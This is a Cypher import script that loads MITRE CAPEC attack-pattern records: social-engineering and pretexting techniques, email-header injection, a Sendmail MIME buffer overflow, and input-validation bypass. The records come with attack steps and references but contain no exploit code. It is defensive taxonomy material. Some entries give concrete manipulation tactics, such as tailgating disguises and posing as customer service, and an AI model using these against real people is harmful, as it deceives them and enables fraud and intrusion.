CREATE (:Description{id: 340, summary: "OrderedDict([('Text', \"An attacker employs various methods of information gathering to collect a body of information that facilitates the attackers' goals toward the target organization. Because an attacker's goals can vary so widely during this phase there is no one particular methodology that is often employed. During the research phase, for example, an attacker could use a company's automated directory service via the telephone to identify individuals in key positions of authority. Other methods could involve casing an establishment during high traffic hours to determine how strictly employees monitor who is entering the building behind them or something as simple as internet searching. Gathering information to support social engineering exercises is much the same as research you do for anything else. You need a goal in mind when you start in order to keep the research focused. Having a clear objective helps you determine what information is relevant to the end goal and what can be ignored. This holds true not only for the information gathered but also for how it's gathered.\")])"});
MERGE (:Reference{id: "REF-30", local_id: "R.405.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 406, name: "Social Information Gathering via Dumpster Diving", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 347});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 341, summary: "OrderedDict([('Text', 'An attacker cases an establishment and searches through trash bins, dumpsters, or areas where company information may have been accidentally discarded for information items which may be useful to the dumpster diver. The devastating nature of the items and/or information found can be anything from medical records, resumes, personal photos and emails, bank statements, account details or information about software, tech support logs and so much more. By collecting this information an attacker may be able to learn important facts about the person or organization that play a role in helping the attacker in their attack.')])"});
MERGE (:Reference{id: "REF-30", local_id: "R.406.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 407, name: "Social Information Gathering via Pretexting", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 348});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 342, summary: "OrderedDict([('Text', \"An attacker engages in pretexting behavior to solicit information from target persons, or manipulate the target into performing some action that serves the attackers' interests. During a pretexting attack the attacker creates an invented scenario, assuming an identity or role to persuade a targeted victim to release information or perform some action. It is more than just creating a lie, in some cases it can be creating a whole new identity and then using that identity to manipulate the receipt of information. Pretexting can also be used to impersonate people in certain jobs and roles that they never themselves have done. Basic pretexting attacks may simply seek to learn information about a target, but more complicated pretexting attacks seek to solicit a target to perform some action that assists the attacker in exploiting organizational weaknesses or obtaining access to secure facilities or systems. One example of a pretexting attack could be to dress up like a jogger and run in place by the entrance of a building, pretending to look for your access card. Because the hood obscures you face, it may be possible to solicit someone inside the building to let you inside. Pretexting is also not a one-size fits all solution. A social engineering attacker will have to develop many different pretexts over their career. All of them will have one thing in common, research. Good information gather techniques can make or break a good pretext. Being able to mimic the perfect tech support rep is useless if the target does not use outside support. Pretexting is also used in other areas of life other than social engineering. Sales, public speaking, so-called fortune tellers, NLP experts and even doctors, lawyers, therapists and the like all have to use a form of pretexting. They all have to create a scenario where a person is comfortable with releasing information they normally would not. One of the most important aspects of social engineering is trust. If the attacker cannot build trust they will most likely fail. A solid pretext is an essential part of building trust. If an attacker's alias, story, or identity has holes or lacks credibility or even the perception of credibility the target will most likely catch on. Similar to inserting the proper key in a lock, the right pretext provides the proper cues to those around the attacker and can disarm their suspicions or doubts and open up the doors, so to speak. .\")])"});
MERGE (:Reference{id: "REF-30", local_id: "R.407.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 408, name: "Information Gathering from Traditional Sources", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 349});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 343, summary: "OrderedDict([('Text', \"An attacker engages in information gathering activities from traditional sources which are typically open, publicly available sources of information that don't require any illegal activity to obtain. Tradition sources can include corporate websites, DNS (Domain Name Service) records, or even social media sites such as blogs or wikis. The goal is to collect as much information as possible so as to construct an accurate model that aids the attacker in conducting further social engineering attacks.\")])"});
MERGE (:Reference{id: "REF-30", local_id: "R.408.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 409, name: "Information Gathering from Non-Traditional Sources", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 350});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 344, summary: "OrderedDict([('Text', 'An attacker uses sources of information which are less obvious and often overlooked to learn about the target person or organization. These sources could be industry experts or insiders who might reveal key pieces of information that help the attacker determine possible social engineering vulnerabilities in the target. Other types of oblique information gathering might be to case or stalk particular employees to find out popular after work venues. The attacker would then visit that venue and sit in close proximity to the target individuals to gather information.')])"});
MERGE (:Reference{id: "REF-30", local_id: "R.409.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 41, name: "Using Meta-characters in E-mail Headers to Inject Malicious Payloads", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 306, text: "<div level=\"0\">\n  <p class=\"text\">This attack targets most widely deployed feature rich email applications, including web based email programs.</p>\n</div>"});
CREATE (:Submission{id: 351});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 345, summary: "OrderedDict([('Text', ['This type of attack involves an attacker leveraging meta-characters in email headers to inject improper behavior into email programs.', \"Email software has become increasingly sophisticated and feature-rich. In addition, email applications are ubiquitous and connected directly to the Web making them ideal targets to launch and propagate attacks. As the user demand for new functionality in email applications grows, they become more like browsers with complex rendering and plug in routines. As more email functionality is included and abstracted from the user, this creates opportunities for attackers. Virtually all email applications do not list email header information by default, however the email header contains valuable attacker vectors for the attacker to exploit particularly if the behavior of the email client application is known. Meta-characters are hidden from the user, but can contain scripts, enumerations, probes, and other attacks against the user's system.\"])])"});
CREATE (:AttackPhase{id: 1, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Identify and characterize metacharacter-processing vulnerabilities in email headers", description: "<div level=\"0\">\n  <p class=\"text\">An attacker creates emails with headers containing various metacharacter-based malicious payloads in order to determine whether the target application processes the malicious content and in what manner it does so.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use an automated tool (fuzzer) to create malicious emails headers containing metacharacter-based payloads.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Manually tampering email headers to inject malicious metacharacter-based payload content in them.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The email client processes metacharacters in email headers.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The email client does not process metacharacters in email headers.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The email server will strip the headers that contain metacharacters</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The email server lets the malicious metacharacters in the email headers.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The email client executes the malicious payload."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No malicious content is being delivered in the email by the server."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker leverages vulnerabilities identified during the Experiment Phase to inject malicious email headers and cause the targeted email application to exhibit behavior outside of its expected constraints.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Send emails with specifically-constructed, metacharacter-based malicious payloads in the email headers to targeted systems running email processing applications identified as vulnerable during the Experiment Phase.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The payload executes on the target user's system."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.41.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 150});
MERGE (:CWE{id: 88});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 713});
CREATE (:AttackPattern{id: 410, name: "Information Elicitation via Social Engineering", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 352});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 346, summary: "OrderedDict([('Text', 'An attacker engages an individual using any combination of social engineering methods for the purpose of extracting information. Accurate contextual and environmental queues, such as knowing important information about the target company or individual can greatly increase the success of the attack and the quality of information gathered. Authentic mimicry combined with detailed knowledge increases the success of elicitation attacks.')])"});
MERGE (:Reference{id: "REF-30", local_id: "R.410.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 411, name: "DEPRECATED: Pretexting", status: "Deprecated", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 353});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 347, summary: "OrderedDict([('Text', \"An attacker engages in pretexting behavior to solicit information from target persons, or manipulate the target into performing some action that serves the attackers' interests. Pretexting involves a mixture of role-play, subterfuge, and possibly some forms of disguise. Basic pretexting attacks may simply seek to learn information about a target, but more complicated pretexting attacks seek to solicit a target to perform some action that assists the attacker in exploiting organizational weaknesses or obtaining access to secure facilities or systems. One example of a pretexting attack could be to dress up like a jogger and run in place by the entrance of a building, pretending to look for your access card. Because the hood obscures you face, it may be possible to solicit someone inside the building to let you inside.\")])"});
MERGE (:Reference{id: "REF-30", local_id: "R.411.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 412, name: "Pretexting via Customer Service", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 354});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 348, summary: "OrderedDict([('Text', \"An attacker engages in pretexting behavior, assuming the role of someone who works for Customer Service, to solicit information from target persons, or manipulate the target into performing an action that serves the attackers' interests. One example of a scenario such as this would be to call an individual, articulate your false affiliation with a credit card company, and then attempt to get the individual to verify their credit card number.\")])"});
MERGE (:Reference{id: "REF-30", local_id: "R.412.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 413, name: "Pretexting via Tech Support", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 355});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 349, summary: "OrderedDict([('Text', \"An attacker engages in pretexting behavior, assuming the role of a tech support worker, to solicit information from target persons, or manipulate the target into performing an action that serves the attackers' interests. An attacker who uses social engineering to impersonate a tech support worker can have devastating effects on a network. This is an effective attack vector, because it can give an attacker physical access to network computers. It only takes a matter of seconds for someone to compromise a computer with physical access. One of the best technological tools at the disposal of a social engineer, posing as a technical support person, is a USB thumb drive. These are small, easy to conceal, and can be loaded with different payloads depending on what task needs to be done. However, this form of attack does not require physical access as it can also be effectively carried out via phone or email.\")])"});
MERGE (:Reference{id: "REF-30", local_id: "R.413.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 414, name: "Pretexting via Delivery Person", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 356});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 350, summary: "OrderedDict([('Text', 'An attacker engages in pretexting behavior, assuming the role of a delivery person, to solicit information from target persons, or manipulate the target into performing an action that serves the attackers\\' interests. Impersonating a delivery person is an effective attack and an easy attack since not much acting is involved. Usually the hardest part is looking the part and having all of the proper credentials, papers and \"deliveries\" in order to be able to pull it off.')])"});
MERGE (:Reference{id: "REF-30", local_id: "R.414.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 415, name: "Pretexting via Phone", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 357});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 351, summary: "OrderedDict([('Text', \"An attacker engages in pretexting behavior, assuming some sort of trusted role, and contacting the targeted individual or organization via phone to solicit information from target persons, or manipulate the target into performing an action that serves the attackers' interests. This is the most common social engineering attack. Some of the most commonly effective approaches are to impersonate a fellow employee, impersonate a computer technician or to target help desk personnel.\")])"});
MERGE (:Reference{id: "REF-30", local_id: "R.415.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 416, name: "Target Influence via Social Engineering", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 307, text: "<div level=\"0\">\n  <p class=\"text\">The adversary must have the means and knowledge of how to communicate with the target in some manner.</p>\n</div>"});
CREATE (:Submission{id: 358});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 256});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Methods_of_Attack, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 352, summary: "OrderedDict([('Text', \"An adversary exploits inherent human psychological predispositions to influence a targeted individual or group to solicit information or manipulate the target into performing an action that serves the attackers' interests. Many interpersonal social engineering techniques do not involve outright deception, although they can; many are subtle ways of manipulating a target to remove barriers, make the target feel comfortable, and produce an exchange in which the target is either more likely to share information directly, or let key information slip out unintentionally. A skilled adversary uses these techniques when appropriate to produce the desired outcome. Manipulation techniques vary from the overt, such as pretending to be a supervisor to a help desk, to the subtle, such as making the target feel comfortable with the adversary's speech and thought patterns.\")])"});
MERGE (:Reference{id: "REF-30", local_id: "R.416.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 417, name: "Target Influence via Perception of Reciprocation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 359});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 353, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.417.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 418, name: "Target Influence via Perception of Obligation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 360});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 354, summary: "OrderedDict([('Text', 'An attacker uses a social engineering technique to produce a sense of obligation within the target to volunteer some key or sensitive piece of information. Obligation has to do with actions one feels they need to take due to some sort of social, legal, or moral requirement, duty, contract, or promise. In the context of social engineering, obligation is closely related to reciprocation but is not limited to it. There are various techniques for producing a sense of obligation during ordinary modes of communication. One method is to compliment the target, and follow up the compliment with a question. If performed correctly the target may volunteer a key piece of information, sometimes involuntarily. It can also be as simple as holding an outer door for someone will usually make them hold the inner door for you. It can be escalated to someone giving you private info because you create a sense of obligation. This is a common attack vector when targeting customer service people.')])"});
MERGE (:Reference{id: "REF-30", local_id: "R.418.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 419, name: "Target Influence via Perception of Concession", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 361});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 355, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.419.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 42, name: "MIME Conversion", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 308, text: "<div level=\"0\">\n  <p class=\"text\">The target system uses a mail server.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 309, text: "<div level=\"0\">\n  <p class=\"text\">Mail server vendor has not released a patch for the MIME conversion routine, the patch itself has a security hole or does not fix the original problem, or the patch has not been applied to the user's system.</p>\n</div>"});
CREATE (:Submission{id: 362});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 356, summary: "OrderedDict([('Text', 'An attacker exploits a weakness in the MIME conversion routine to cause a buffer overflow and gain control over the mail server machine. The MIME system is designed to allow various different information formats to be interpreted and sent via e-mail. Attack points exist when data are converted to MIME compatible format and back.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine whether the mail server is unpatched and is potentially vulnerable to one of the known MIME conversion buffer overflows (e.g. Sendmail 8.8.3 and 8.8.4).</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Identify places in the system where vulnerable MIME conversion routines may be used.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Send e-mail messages to the target system with specially crafted headers that trigger the buffer overflow and execute the shell code.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.42.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{local_id: "R.42.2", title: "CERT Advisory CA-1997-05 MIME Conversion Buffer Overflow in Sendmail Versions 8.8.3 and 8.8.4", publisher: "Software Engineering Institute: Carnegie Mellon University", link: "http://www.cert.org/advisories/CA-1997-05.html"});
CREATE (:CVE{id: "CVE-1999-0047", description: "<div level=\"0\">\n  <p class=\"text\">A MIME conversion buffer overflow exists in Sendmail versions 8.8.3 and 8.8.4. Sendmail versions 8.8.3 and 8.8.4 are vulnerable to a buffer overflow in the MIME handling code. By sending a message with specially-crafted headers to the server, a remote attacker can overflow a buffer and execute arbitrary commands on the system with root privileges.</p>\n  <p class=\"text\">Sendmail performs a 7 bit to 8 bit conversion on email messages. This vulnerability is due to the fact that insufficient bounds checking was performed while performing these conversions. This gave attacker an opportunity to overwrite the internal stack of sendmail while it is executing with root privileges. An attacker first probes the target system to figure out what mail server is used on the system and what version. An attacker could then test out the exploit at their leisure on their own machine running the same version of the mail server before using it in the wild.</p>\n</div>"});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 119});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
CREATE (:AttackPattern{id: 420, name: "Target Influence via Perception of Scarcity", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 363});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 357, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.420.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 421, name: "Target Influence via Perception of Authority", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 364});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 358, summary: "OrderedDict([('Text', 'An attacker uses a social engineering technique to convey a sense of authority that motivates the target reveal specific information or take specific action. There are various techniques for producing a sense of authority during ordinary modes of communication. One common method is impersonation. By impersonating someone with a position of power within an organization an attacker may motivate the target individual to reveal some piece of sensitive information or perform an action that benefits the attacker.')])"});
MERGE (:Reference{id: "REF-30", local_id: "R.421.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 422, name: "Target Influence via Perception of Commitment and Consistency", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 365});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 359, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.422.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 423, name: "Target Influence via Perception of Liking", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 366});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 360, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.423.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 424, name: "Target Influence via Perception of Consensus or Social Proof", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 367});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 361, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.424.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 425, name: "Target Influence via Framing", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 368});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 362, summary: "OrderedDict([('Text', 'An attacker uses framing techniques to contextualize a conversation so that the target is more likely to be influenced by the attackers\\' point of view. Framing is information and experiences in life that alter the way we react to decisions we must make. This type of persuasive technique exploits the way people are conditioned to perceive data and its significance, while avoiding negative or avoidance responses from the target. Rather than a specific technique framing is a methodology of conversation that slowly encourages the target to adopt to the attackers\\' perspective. One technique of framing is to avoid the use of the word \"No\" and to contextualize responses in a manner that is positive. When performed skillfully the target is much more likely to volunteer information or perform actions favorable to the attacker.')])"});
MERGE (:Reference{id: "REF-30", local_id: "R.425.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
MERGE (:Reference{id: "REF-6", local_id: "R.425.2", title: "Wikipedia", section: "Framing (social sciences)", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Framing_(social_sciences)"});
CREATE (:AttackPattern{id: 426, name: "Target Influence via Manipulation of Incentives", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 369});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 363, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.426.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 427, name: "Target Influence via Psychological Principles", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 370});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 364, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.427.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 428, name: "Target Influence via Modes of Thinking", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 371});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 257});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:Description{id: 365, summary: "OrderedDict([('Text', 'The adversary tailors their communication to the language and thought patterns of the target thereby weakening barriers or reluctance to communication. This method is a way of building rapport with a target by matching their speech patterns and the primary ways or dominant senses with which they make abstractions. This technique can be used to make the target more receptive to sharing information because the adversary has adapted their communication forms to match those of the target. When skillfully employed, the target is likely to be unaware that they are being manipulated.')])"});
MERGE (:Reference{id: "REF-30", local_id: "R.428.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 429, name: "Target Influence via Eye Cues", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 372});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 366, summary: "OrderedDict([('Text', None)])"});
MERGE (:Reference{id: "REF-30", local_id: "R.429.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 43, name: "Exploiting Multiple Input Interpretation Layers", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 310, text: "<div level=\"0\">\n  <p class=\"text\">User input is used to construct a command to be executed on the target system or as part of the file name.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 311, text: "<div level=\"0\">\n  <p class=\"text\">Multiple parser passes are performed on the data supplied by the user.</p>\n</div>"});
CREATE (:Submission{id: 373});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 367, summary: "OrderedDict([('Text', ['An attacker supplies the target software with input data that contains sequences of special characters designed to bypass input validation logic. This exploit relies on the target making multiples passes over the input data and processing a \"layer\" of special characters with each pass. In this manner, the attacker can disguise input that would otherwise be rejected as invalid by concealing it with layers of special/escape characters that are stripped off by subsequent processing steps.', 'The goal is to first discover cases where the input validation layer executes before one or more parsing layers. That is, user input may go through the following logic in an application:', 'In such cases, the attacker will need to provide input that will pass through the input validator, but after passing through parser2, will be converted into something that the input validator was supposed to stop.']), ('Block', OrderedDict([('Code', ['<parser1>', '--> <input validator> -->', '<parser2>'])]))])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Determine application/system inputs where bypassing input validation is desired", description: "<div level=\"0\">\n  <p class=\"text\">The attacker first needs to determine all of the application's/system's inputs where input validation is being performed and where he/she wants to bypass it.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">While using an application/system, the attacker discovers an input where validation is stopping him/her from performing some malicious or unauthorized actions.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">When provided with unexpected input, application provides an error message stating that the input was invalid or that access was denied.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Determine which character encodings are accepted by the application/system", description: "<div level=\"0\">\n  <p class=\"text\">The attacker then needs to provide various character encodings to the application/system and determine which ones are accepted. The attacker will need to observe the application's/system's response to the encoded data to determine whether the data was interpreted properly.</p>\n</div>"});
